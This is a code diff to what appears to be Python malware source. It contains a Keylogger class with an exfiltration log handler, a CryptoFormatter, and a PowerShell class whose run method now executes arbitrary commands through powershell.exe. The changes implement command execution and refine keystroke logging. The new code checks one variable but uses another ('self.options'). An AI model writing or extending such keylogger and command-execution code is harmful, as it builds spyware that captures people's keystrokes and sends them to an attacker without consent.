@@ -100,14 +100,23 @@ class PowerShell(object):
     def __init__(self):
         self._target = os.path.join(
             os.environ['SystemRoot'],
-            'SysWOW64' if ctypes.sizeof(
-                ctypes.c_void_p) == 4 else 'System32',
+            'SysWOW64' if ctypes.sizeof(ctypes.c_void_p) == 4 else 'System32',
             'WindowsPowerShell',
             'v2.0',
             'powershell.exe')
 
     def run(self, command, options=options):
-        pass
+        if not isinstance(options, list):
+            sys.exit(1)
+
+        args = self.options
+        args.insert(0, self._target)
+        args.append(command)
+
+        try:
+            subprocess.check_call(args=args, shell=False)
+        except subprocess.CalledProcessError:
+            sys.exit(1)
 
 
 class CryptoFormatter(logging.Formatter):
@@ -179,7 +188,8 @@ class Keylogger(object):
         self.logger.addHandler(self.exfil_handler)
 
     def log(self, key):
-        self.logger.info(key)
+        if key:
+            self.logger.info(key)
 
     def __del__(self):
         self.logger.removeHandler(self.exfil_handler)
